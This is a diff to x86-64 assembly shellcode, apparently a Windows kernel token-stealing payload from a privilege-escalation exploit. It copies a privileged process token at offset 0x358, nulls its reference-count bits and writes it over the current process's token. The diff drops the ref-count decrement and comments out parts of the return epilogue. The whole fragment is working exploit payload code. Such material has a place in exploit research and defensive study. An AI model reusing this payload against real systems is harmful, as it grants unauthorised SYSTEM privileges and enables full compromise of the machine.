@@ -47,16 +47,15 @@ jnz loop
 
 mov rcx, [rbx + 0x358] 
 and cl, 0xf0		;; Null the token
-mov [rax + 0x358], rcx
-mov rbx ,[rax + 0x358]  ;; Override current process token.
-sub rbx, 0x1		;; decriment the ref count.
+mov [rax + 0x358], rcx ;; Override current process token.
+
 
 ;;pop rcx
 ;;pop rbx
 ;;pop rax
-xor rax, rax		;; Change to the epilogue you need.
-xor rsi, rsi		
-xor rdi, rdi
+;;xor rax, rax		;; Change to the epilogue you need.
+;;xor rsi, rsi		
+;;xor rdi, rdi
 ;;pop rsp	
-add rsp, 28
+;;add rsp, 28
 ret
